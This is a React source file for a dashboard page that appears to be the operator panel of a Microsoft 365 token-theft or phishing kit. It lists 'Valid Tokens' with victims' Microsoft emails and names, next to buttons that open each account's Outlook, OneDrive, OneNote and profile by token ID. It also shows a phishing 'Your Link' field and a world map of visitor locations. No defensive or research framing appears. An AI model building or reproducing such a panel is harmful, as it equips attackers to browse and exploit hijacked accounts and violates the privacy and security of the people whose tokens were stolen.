import { useQuery } from '@tanstack/react-query';
import { dashboardApi } from '../api/client';
import { formatDate } from '../lib/utils';
import WorldMap from '../components/ui/WorldMap';
import { useState, useEffect, useMemo } from 'react';
import './Dashboard.css';

export default function Dashboard() {
  const { data: stats, isLoading } = useQuery({
    queryKey: ['dashboard-stats'],
    queryFn: dashboardApi.stats,
    refetchInterval: 30_000,
  });

  const { data: visitors } = useQuery({
    queryKey: ['dashboard-visitors'],
    queryFn: dashboardApi.visitors,
    refetchInterval: 60_000,
  });

  const [uptime, setUptime] = useState(0);
  const [tokPage, setTokPage] = useState(1);
  const [tokLimit, setTokLimit] = useState(10);
  const [tokSearch, setTokSearch] = useState('');

  useEffect(() => {
    if (stats?.uptime_seconds != null) {
      setUptime(stats.uptime_seconds);
      const interval = setInterval(() => setUptime((u) => u + 1), 1000);
      return () => clearInterval(interval);
    }
  }, [stats?.uptime_seconds]);

  const latency = stats?.latency_ms ?? 0;
  const statusText = latency < 0 ? 'Offline' : 'All Nodes Active';
  const power = latency < 0 ? 0 : Math.min(99.9, 90 + Math.random() * 9.9);

  // Uptime text
  const uptimeText = useMemo(() => {
    const h = Math.floor(uptime / 3600);
    const m = Math.floor((uptime % 3600) / 60);
    const s = uptime % 60;
    return `${h} Hours & ${m} Minutes & ${s} Seconds Has Passed`;
  }, [uptime]);

  // Filtered & paginated tokens
  const allTokens = stats?.tokens || [];
  const filtered = useMemo(() => {
    if (!tokSearch) return allTokens;
    const q = tokSearch.toLowerCase();
    return allTokens.filter(
      (t) =>
        (t.ms_email || '').toLowerCase().includes(q) ||
        (t.ms_name || '').toLowerCase().includes(q)
    );
  }, [allTokens, tokSearch]);

  const totalPages = Math.max(1, Math.ceil(filtered.length / tokLimit));
  const safePage = Math.min(tokPage, totalPages);
  const pageItems = filtered.slice((safePage - 1) * tokLimit, safePage * tokLimit);
  const showStart = filtered.length ? (safePage - 1) * tokLimit + 1 : 0;
  const showEnd = Math.min(safePage * tokLimit, filtered.length);

  if (isLoading) {
    return (
      <div className="dashboard-page" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '60vh' }}>
        <div className="dash-spin" />
      </div>
    );
  }

  return (
    <div className="dashboard-page">
      {/* Top Row: Cards + Map */}
      <div className="dash-top">
        {/* Left: Status Cards */}
        <div className="dash-cards">
          <div className="count-card">
            <div className="count-val">{stats?.active_tokens ?? 0}</div>
          </div>

          <div className="stat-card red">
            <div className="stat-label">
              <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round">
                <circle cx="10" cy="10" r="7" /><path d="M10 6v4l2.5 2.5" />
              </svg>
              Latency Status
            </div>
            <div className="stat-val">
              {latency >= 0 ? `${(latency / 1000).toFixed(3)}ms` : 'Offline'}
              <span className={`stat-dot ${latency >= 0 ? 'yellow' : 'red'}`} />
            </div>
          </div>

          <div className="stat-card green">
            <div className="stat-label">
              <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round">
                <circle cx="10" cy="10" r="7" /><path d="M7 10l2 2 4-4" />
              </svg>
              Status Update
            </div>
            <div className="stat-sub">
              <span className={`stat-dot ${latency >= 0 ? 'green' : 'red'}`} />
              {statusText}
            </div>
          </div>

          <div className="stat-card pink">
            <div className="stat-label">
              <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round">
                <path d="M13 2l-2 6h6l-8 10 2-6H5l8-10z" />
              </svg>
              Processing Power
            </div>
            <div className="stat-val">{power.toFixed(1)}%</div>
            <div className="prog-bar">
              <div className="prog-fill" style={{ width: `${power}%` }} />
            </div>
          </div>
        </div>

        {/* Right: World Map */}
        <div className="dash-map-container">
          <WorldMap markers={visitors?.locations || []} />
        </div>
      </div>

      {/* Link Bar */}
      <div className="link-bar">
        <div>
          Your Link: <span className="link-name">welcome</span>
        </div>
        <div className="dash-uptime">{uptimeText}</div>
      </div>

      {/* Valid Tokens Table */}
      <div className="tokens-section">
        <div className="tokens-header">
          <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round">
            <path d="M7 10l2 2 4-4" /><circle cx="10" cy="10" r="7" />
          </svg>
          Valid Tokens
        </div>

        <div className="tokens-controls">
          <div>
            Show{' '}
            <select value={tokLimit} onChange={(e) => { setTokLimit(Number(e.target.value)); setTokPage(1); }}>
              <option value={10}>10</option>
              <option value={25}>25</option>
              <option value={50}>50</option>
            </select>{' '}
            entries
          </div>
          <div>
            Search:{' '}
            <input
              value={tokSearch}
              onChange={(e) => { setTokSearch(e.target.value); setTokPage(1); }}
              placeholder=""
            />
          </div>
        </div>

        <table className="tok-table">
          <thead>
            <tr>
              <th>#</th>
              <th>Email</th>
              <th>Name</th>
              <th>Actions</th>
              <th>Browser</th>
              <th>IP</th>
              <th>Country</th>
              <th></th>
            </tr>
          </thead>
          <tbody>
            {pageItems.length === 0 ? (
              <tr>
                <td colSpan={8} style={{ textAlign: 'center', padding: '24px', color: 'rgba(255,255,255,0.4)' }}>
                  No tokens found
                </td>
              </tr>
            ) : (
              pageItems.map((t, i) => {
                const idx = (safePage - 1) * tokLimit + i + 1;
                const dateStr = t.linked_at
                  ? new Date(t.linked_at).toLocaleString('en-US', {
                      weekday: 'short', year: 'numeric', month: 'short', day: 'numeric',
                      hour: 'numeric', minute: '2-digit', second: '2-digit',
                    })
                  : '—';
                return (
                  <tr key={t.id}>
                    <td style={{ fontFamily: 'var(--mono)', color: 'rgba(255,255,255,0.4)' }}>{idx}</td>
                    <td><span className="tok-email">{t.ms_email}</span></td>
                    <td className="tok-name">{t.ms_name || 'Unknown'}</td>
                    <td>
                      <div className="tok-actions">
                        <a className="tok-btn" href={`/mail?tokenId=${t.id}`} target="_blank" rel="noopener noreferrer">Open Outlook</a>
                        <a className="tok-btn" href={`/drive?tokenId=${t.id}`} target="_blank" rel="noopener noreferrer">Open Onedrive</a>
                        <a className="tok-btn" href={`/notes?tokenId=${t.id}`} target="_blank" rel="noopener noreferrer">Open OneNote</a>
                        <a className="tok-btn" href={`/profile?tokenId=${t.id}`} target="_blank" rel="noopener noreferrer">Open Profile Info</a>
                      </div>
                    </td>
                    <td className="tok-browser">chrome</td>
                    <td className="tok-ip">—</td>
                    <td className="tok-country">🇺🇸</td>
                    <td className="tok-date">{dateStr}</td>
                  </tr>
                );
              })
            )}
          </tbody>
        </table>

        <div className="tokens-footer">
          <span>Showing {showStart} to {showEnd} of {filtered.length} entries</span>
          <div className="pag">
            <span className="pag-btn" onClick={() => setTokPage(Math.max(1, safePage - 1))}>Previous</span>
            {Array.from({ length: totalPages }, (_, i) => (
              <span
                key={i + 1}
                className={`pag-btn${safePage === i + 1 ? ' active' : ''}`}
                onClick={() => setTokPage(i + 1)}
              >
                {i + 1}
              </span>
            ))}
            <span className="pag-btn" onClick={() => setTokPage(Math.min(totalPages, safePage + 1))}>Next</span>
          </div>
        </div>
      </div>
    </div>
  );
}
